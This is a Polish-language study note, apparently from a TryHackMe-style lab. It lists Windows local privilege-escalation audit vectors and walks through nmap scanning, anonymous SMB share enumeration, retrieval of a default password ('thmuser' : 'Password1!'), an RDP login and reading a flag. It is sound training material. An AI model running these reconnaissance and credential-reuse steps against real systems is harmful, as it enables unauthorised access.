---

### **Ogólne wektory audytu uprawnień lokalnych w Windows**

Gdy konto posiada standardowe uprawnienia, w teorii bezpieczeństwa Windows analizuje się następujące obszary w celu identyfikacji błędów konfiguracji:

1. **Usługi systemowe (Services)**:
    
    - **Unquoted Service Paths**: Ścieżki do plików wykonywalnych usług zawierające spacje i pozbawione cudzysłowów.
        
    - **Słabe uprawnienia ACL usług**: Usługi, w których zwykły użytkownik ma prawo do modyfikacji pliku binarnego lub konfiguracji usługi (`SERVICE_ALL_ACCESS` lub `SERVICE_CHANGE_CONFIG`).
        
2. **Harmonogram zadań (Scheduled Tasks)**:
    
    - Zadań uruchamianych z uprawnieniami `SYSTEM`, których pliki wykonywalne lub skrypty są modyfikowalne przez zwykłych użytkowników.
        
3. **Oprogramowanie stron trzecich i pliki konfiguracyjne**:
    
    - Przeszukiwanie dysku w poszukiwaniu zapisanych poświadczeń w rejestrze lub plikach (np. `Unattend.xml`, pliki konfiguracji aplikacji).

## 📝 Notatka z ćwiczenia: Enumeracja SMB & Dostęp RDP

### **Podsumowanie postępów:**

1. **Skanowanie portów:** Identyfikacja otwartych portów SMB (`135`, `139`, `445`) oraz RDP (`3389`).
    
2. **Enumeracja SMB:** Wykrycie anonimowego udziału `Public` i pobranie pliku `welcome.txt`.
    
3. **Pozyskanie poświadczeń:** Odczytanie domyślnego loginu i hasła (`thmuser` : `Password1!`).
    
4. **Uzyskanie dostępu:** Połączenie przez zdalny pulpit (RDP) i przejęcie pierwszej flagi (`flag1.txt`).

### **Karta Komend**

#### **1. Skanowanie i diagnostyka sieci (Nmap)**

```
nmap -Pn -p 135,139,445,3389 <TARGET_IP>
```

```
nmap -sC -sV -Pn <TARGET_IP>
```

#### **2. Enumeracja i połączenie SMB (smbclient)**

Wyświetlenie dostępnych udziałów (sesja anonimowa):

```
smbclient -L //<TARGET_IP> -N
```

Połączenie do otwartego udziału:

```
smbclient //<TARGET_IP>/Public -N
```

Pobranie pliku z udziału (wewnątrz sesji SMB):

```
get welcome.txt
```

#### **3. Dostęp zdalny (RDP / xfreerdp)**

Połączenie z pulpitami Windows przy użyciu zdobytych poświadczeń:

```
xfreerdp /v:<TARGET_IP> /u:thmuser /p:'Password1!' /cert:ignore +clipboard /dynamic-resolution
```

#### **4. Rekonstrukcja uprawnień i czytanie flag (Windows CMD)**

Sprawdzenie przywilejów i grup użytkownika:

```
whoami /priv
```

```
whoami /groups
```

Odczytanie flagi:

```
type C:\Users\thmuser\Desktop\flag1.txt
```
